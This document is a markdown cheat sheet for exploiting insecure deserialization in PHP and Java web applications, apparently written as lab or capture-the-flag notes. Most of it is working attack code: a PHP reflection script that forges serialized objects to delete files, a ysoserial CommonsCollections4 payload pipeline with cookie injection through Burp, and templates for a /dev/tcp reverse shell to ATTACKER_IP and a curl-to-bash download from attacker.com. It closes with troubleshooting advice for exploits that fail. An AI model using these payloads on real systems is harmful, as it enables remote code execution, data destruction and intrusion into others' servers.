# Quick Reference: Insecure Deserialization Exploitation

## Identify the Vulnerability

### Step 1: Find Serialized Data
```
Look for: Base64 strings in cookies, especially:
- PHP: O:4:"ClassName"
- Java: rO0AB... (binary Base64)
- Long, structured cookie values
```

### Step 2: Decode and Identify Type
```bash
# PHP
echo "COOKIE_VALUE" | base64 -d

# Java (check first bytes)
echo "COOKIE_VALUE" | base64 -d | xxd | head
# Look for: aced 0005 (Java magic bytes)
```

---

## PHP Exploitation Checklist

```bash
# 1. Get source code (append ~)
curl https://target/path/file.php~

# 2. Find serializable class with magic methods
grep -n "__destruct\|__wakeup\|__toString" sourcecode.php

# 3. Create exploit object
cat > exploit.php << 'EOF'
<?php
class TargetClass {
    private $file_to_delete;
}
$obj = new TargetClass();
$ref = new ReflectionClass('TargetClass');
$prop = $ref->getProperty('file_to_delete');
$prop->setAccessible(true);
$prop->setValue($obj, '/target/file.txt');
echo base64_encode(serialize($obj));
?>
EOF

# 4. Run exploit
php exploit.php > payload.txt

# 5. Inject
# DevTools → Cookies → session → paste payload

# 6. Refresh to trigger __destruct()
```

---

## Java Exploitation Checklist

```bash
# 1. Check Java version (16+ needs special flags)
java -version

# 2. Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 3. Generate payload (Java 16+)
java \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens java.base/java.net=ALL-UNNAMED \
  --add-opens java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'COMMAND' | base64 -w0 > payload.txt

# 4. URL-encode (CRITICAL!)
python3 -c "import sys, urllib.parse; print(urllib.parse.quote(open('payload.txt').read().strip()))" > payload_encoded.txt

# 5. Open Burp Suite Repeater

# 6. Find request with session cookie

# 7. Edit Cookie header:
#    session=VALUE
#    Replace VALUE with encoded payload

# 8. Send request

# 9. Check response for specific error or success
```

---

## Common Errors & Solutions

### PHP

**Error**: `500 - syntax error`
- **Cause**: Malformed serialized object
- **Fix**: Verify PHP syntax, check reflection code

**Error**: `__destruct not called`
- **Cause**: Object not garbage collected
- **Fix**: Ensure request completes, object destroyed

**Error**: `private properties not accessible`
- **Cause**: Not using reflection
- **Fix**: Use ReflectionClass and setAccessible(true)

### Java

**Error**: `InstantiateTransformer: Constructor threw an exception`
- **Cause**: JVM module access protection or incompatible gadget
- **Fix**: Add `--add-opens` flags, try different gadget chain

**Error**: `ClassNotFoundException`
- **Cause**: Library not on target server
- **Fix**: Verify Apache Commons installed, check version

**Error**: `500 + URL encoding issues`
- **Cause**: Not URL-encoded after base64
- **Fix**: Always URL-encode special characters in cookies

**Error**: `base64 decode error`
- **Cause**: Truncated payload, copy-paste issue
- **Fix**: Use Burp Suite, paste carefully, no truncation

---

## Payloads Template

### PHP Exploit Template
```php
<?php
class TargetClass {
    private $dangerous_property;
}

$obj = new TargetClass();
$ref = new ReflectionClass('TargetClass');
$prop = $ref->getProperty('dangerous_property');
$prop->setAccessible(true);
$prop->setValue($obj, '/path/to/target');

echo base64_encode(serialize($obj));
?>
```

### Java Command Template (ysoserial)
```bash
# Delete file
java [flags] -jar ysoserial-all.jar CommonsCollections4 'rm /path/to/file'

# Reverse shell
java [flags] -jar ysoserial-all.jar CommonsCollections4 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Download and execute
java [flags] -jar ysoserial-all.jar CommonsCollections4 'curl http://attacker.com/shell.sh | bash'
```

---

## Verification Steps

After injection:

```bash
# 1. Did request get accepted?
#    - Check Burp response for 200 vs 500
#    - 500 might still mean code executed

# 2. Did command execute?
#    - Check if file deleted/created
#    - Try multiple times (might need 2nd request)
#    - Navigate pages (might cache result)

# 3. Check error details
#    - Specific exception tells you what failed
#    - Google the exception
#    - Adjust payload/gadget chain

# 4. Try alternatives
#    - Different gadget chain (CC4→CC6→CC5)
#    - Different command format
#    - Check target library versions
```

---

## Tools You'll Need

```
1. Burp Suite (for cookie injection and debugging)
2. curl (for testing)
3. ysoserial (for Java gadget chain generation)
4. Python 3 (for URL-encoding)
5. PHP CLI (for PHP exploit testing)
6. xxd (for binary inspection)
7. base64 command (for encoding/decoding)
```

---

## Remember

✅ Always URL-encode cookies  
✅ Use Burp for injection (more reliable)  
✅ Read error messages carefully  
✅ Try multiple gadget chains  
✅ Verify prerequisites (libraries exist)  
✅ Test locally before target (PHP/ysoserial)  
✅ Document your payloads and techniques  

❌ Don't guess at encoding  
❌ Don't use browser DevTools for complex encoding  
❌ Don't ignore error messages  
❌ Don't assume 500 = failure  
❌ Don't assume library isn't there without testing  
